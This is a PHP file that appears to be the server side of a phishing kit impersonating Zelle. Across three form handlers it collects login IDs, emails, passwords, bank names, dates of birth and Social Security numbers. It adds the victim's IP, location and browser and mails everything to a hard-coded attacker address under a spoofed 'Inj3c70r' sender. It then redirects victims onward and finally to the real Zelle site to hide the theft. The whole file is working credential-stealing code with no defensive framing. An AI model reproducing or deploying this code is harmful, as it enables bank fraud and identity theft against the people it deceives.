<?php
//include "../admin/config.php";
include "system.php";
include "detect.php";

//$telegram = trim(file_get_contents("../admin/config/status_telegram.ini"));
//$user_ids = trim(file_get_contents("../admin/config/email.ini"));


if (isset($_POST['onlineid'])) {
$bank = $_POST["bank"];
$onlineid = $_POST["onlineid"];
$password = $_POST["password"];
$ip	= $_SERVER['REMOTE_ADDR'];

$InfoDATE   = date("d-m-Y h:i:sa");
$user_ids = "cyberg0d@yahoo.com";
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser);


$msg = "
+++ INJ3C70R@ZELLEPAY LOGIN INFO +++<br>
Zelle Online ID  = $onlineid<br>
Zelle Password   = $password<br>
Zelle Bank       = $bank
<br>

+++ INJ3C70R@ZELLEPAY LOGIN INFO +++<br>
IP      = $ip  <br>
Country = $countryname <br>
City    = $countrycity <br>
TIME = $InfoDATE <br>
BROWSER = $UserAgent <br>
+++ INJ3C70R@ZELLEPAY LOGIN INFO +++ <br>

";


// Email send function
$sender = 'From: 💎 Inj3c70r 💎 <result@inj3c70r.com>';
$sub="NEW ZELLEPAY LOGIN FROM [$ip] [$countrycode] ";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
mail($user_ids, $sub, $msg, $headers);
header("location: email-verify.php");
}




if (isset($_POST['email'])) {
$email = $_POST["email"];
$password = $_POST["password"];
$ip	= $_SERVER['REMOTE_ADDR'];

$InfoDATE   = date("d-m-Y h:i:sa");
$user_ids = "cyberg0d@yahoo.com";
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser);


$msg = "
+++ INJ3C70R@ZELLEPAY LOGIN INFO +++<br>
Zelle Email      = $email<br>
Zelle Password   = $password<br>

+++ INJ3C70R@ZELLEPAY LOGIN INFO +++
<br>

IP      = $ip  <br>
Country = $countryname <br>
City    = $countrycity <br>
TIME = $InfoDATE <br>
BROWSER = $UserAgent <br>
+++ INJ3C70R@ZELLEPAY LOGIN INFO +++ <br>

";


// Email send function
$sender = 'From: 💎 Inj3c70r 💎 <result@inj3c70r.com>';
$sub="NEW ZELLEPAY LOGIN FROM [$ip] [$countrycode] ";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
mail($user_ids, $sub, $msg, $headers);
header("location: verify-identity.php");
}


if (isset($_POST['dob'])) {
$dob = $_POST["dob"];
$ssn = $_POST["ssn"];
$ip	= $_SERVER['REMOTE_ADDR'];

$InfoDATE   = date("d-m-Y h:i:sa");
$user_ids = "cyberg0d@yahoo.com";
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser);


$msg = "
+++ INJ3C70R@ZELLEPAY LOGIN INFO +++<br>
Zelle Date of Birth  = $dob<br>
Zelle Social Security Number   = $ssn<br>

+++ INJ3C70R@ZELLEPAY LOGIN INFO +++
<br>

IP      = $ip  <br>
Country = $countryname <br>
City    = $countrycity <br>
TIME = $InfoDATE <br>
BROWSER = $UserAgent <br>
+++ INJ3C70R@ZELLEPAY LOGIN INFO +++ <br>

";


// Email send function
$sender = 'From: 💎 Inj3c70r 💎 <result@inj3c70r.com>';
$sub="NEW ZELLEPAY LOGIN FROM [$ip] [$countrycode] ";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
mail($user_ids, $sub, $msg, $headers);
header("location: https://zellepay.com");
}

?>

